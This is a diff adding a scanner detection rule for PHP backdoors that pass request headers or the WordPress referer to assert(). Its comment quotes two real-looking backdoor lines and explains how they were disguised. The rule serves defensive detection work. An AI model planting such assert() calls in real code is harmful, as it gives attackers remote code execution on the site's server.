@@ -1,0 +1,76 @@
+# PHP's assert() used as an eval sink on request input.
+#
+# Before PHP 8, `assert()` given a string *evaluates it as PHP*. That makes
+# `assert($_SERVER['HTTP_X_FORWARD_FOR'])` a complete remote code execution
+# backdoor that never contains the word `eval`, and it is why assert was the
+# preferred sink for injected WordPress plugins for years.
+#
+# The 2011 plugin-repository compromise shipped two of these. W3 Total Cache's
+# PgCache.php got
+#
+#   if (isset($_SERVER['HTTP_X_FORWARD_FOR']) && assert($_SERVER['HTTP_X_FORWARD_FOR']))
+#
+# which reads as a proxy-header check. AddThis got its backdoor inside a
+# thirty-entry array of language names -- `'re'=>@assert(wp_get_referer())` --
+# where the `@` suppresses any error and the surrounding data makes the line
+# invisible to anyone scanning for code.
+#
+# Stated in execution rather than beside the dispatcher rule that already
+# covers this incident, because it is a different sink reached a different
+# way: no dispatcher, no array of function names, just a header evaluated
+# where a boolean was expected.
+defaults:
+  platforms: [unix, windows]
+  for: [php, text]
+  attack: T1505.003,T1059.006
+  mbc: B0030
+
+traits:
+  - id: php-assert-call
+    desc: Calls PHP assert
+    crit: notable
+    conf: 0.9
+    # Notable rather than component: in PHP before 8 a string argument to
+    # assert is executed, so the call is a code-execution sink wherever it
+    # appears, and a hostile composite needs at least one leg that carries
+    # weight on its own.
+    if:
+      type: text
+      regex: '@?\bassert\s*\('
+
+  - id: server-superglobal-read
+    desc: Reads the server superglobal
+    crit: component
+    conf: 0.85
+    # Only the two superglobals the request-params micro-behaviour does not
+    # already cover; `$_GET`/`$_POST` are referenced from there instead of
+    # being restated here.
+    if:
+      type: text
+      regex: '\$_(SERVER|REQUEST)\s*\['
+
+  - id: wp-referer-read
+    desc: Reads the WordPress referer
+    crit: component
+    conf: 0.85
+    if:
+      type: text
+      regex: '\bwp_get_referer\s*\('
+
+composite_rules:
+  - id: assert-evaluates-request-input
+    desc: assert evaluates request input
+    crit: hostile
+    conf: 0.96
+    # Same line: the request value is the argument, not merely nearby. That is
+    # what separates a backdoor from a plugin that happens to assert something
+    # and also happens to read a header elsewhere in the file.
+    near_lines: 1
+    all:
+      - id: php-assert-call
+    any:
+      - id: server-superglobal-read
+      - id: wp-referer-read
+      - id: micro-behaviors/communications/http/request/params::get-post-param-access
+    unless:
+      - id: metadata/package/testing/
